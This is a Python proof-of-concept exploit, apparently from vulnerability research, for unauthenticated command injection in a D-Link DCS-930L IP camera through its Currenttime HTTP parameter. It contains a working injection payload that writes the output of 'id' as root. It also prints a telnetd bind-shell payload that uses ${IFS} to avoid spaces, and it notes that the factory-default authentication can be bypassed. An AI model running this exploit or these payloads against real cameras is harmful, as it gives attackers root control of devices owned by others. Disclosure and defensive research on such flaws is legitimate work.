#!/usr/bin/env python3
"""
PoC: V1 - Unauthenticated OS Command Injection via HTTP Currenttime parameter
Target: D-Link DCS-930L IP Camera firmware v1.16.04 (mydlink 2.1.0-b41, mipsel)
Binary: alphapd — websKernalParameter @ 0x413778
Sink:   doSystem("date -s %s &", websGetVar("Currenttime"))
Auth:   Bypassed — websCheckRealm grants level 3 when AdminID/AdminPassword empty (factory default)
Filter: NONE — no sanitization on Currenttime parameter

Evidence: E6-runtime-confirmed (QEMU emulation, root uid=0)
strace: execve("/bin/sh",{"sh","-c","date -s 2027-09-22;id>/tmp/pwned_v1 &"})
        -> /tmp/pwned_v1 contains: uid=0(root) gid=0(root)
Binary MD5 (original): b17cd8a0965c0f131b57e429a9165f6e

Note: Runtime verification required 3 NOP patches to bypass /dev/gpio hardware
dependency (getSysInfoBuffer needs /dev/gpio RTC which QEMU cannot emulate).
The patches bypass hardware dependency, NOT security mechanisms.
On real hardware, no patches are needed.

Usage:
  python3 poc_v1_currenttime_rce.py <target_ip> [target_port]
  Default: target_ip=127.0.0.1 target_port=80

Example:
  python3 poc_v1_currenttime_rce.py 192.168.1.10
  python3 poc_v1_currenttime_rce.py 127.0.0.1 80
"""
import sys
import urllib.request
import time

def exploit(target_ip, target_port=80):
    base = f"http://{target_ip}:{target_port}"

    # Payload: semicolon breaks out of "date -s %s &" command
    # doSystem formats: "date -s <Currenttime> &"
    # NO trailing ";" — the "&" suffix closes the last command cleanly
    payload = "2027-09-22;id>/tmp/pwned_v1"

    url = f"{base}/home.htm?Currenttime={payload}"
    print(f"[*] Target:  {base}")
    print(f"[*] Payload: Currenttime={payload}")
    print(f"[*] Injected command: date -s 2027-09-22;id>/tmp/pwned_v1 &")
    print(f"[*] Sending GET request...")

    try:
        req = urllib.request.Request(url)
        resp = urllib.request.urlopen(req, timeout=10)
        print(f"[*] Response: HTTP {resp.status}")
    except Exception as e:
        print(f"[!] Request error (may still be vulnerable): {e}")

    print(f"[*] Waiting 3s for command execution...")
    time.sleep(3)

    print(f"[+] Exploit sent. Check /tmp/pwned_v1 on target for 'uid=0(root)' output")
    print(f"[+] Reverse shell: 2027-09-22;telnetd${{IFS}}-l${{IFS}}/bin/sh${{IFS}}-p${{IFS}}4444")

if __name__ == "__main__":
    ip = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
    exploit(ip, port)
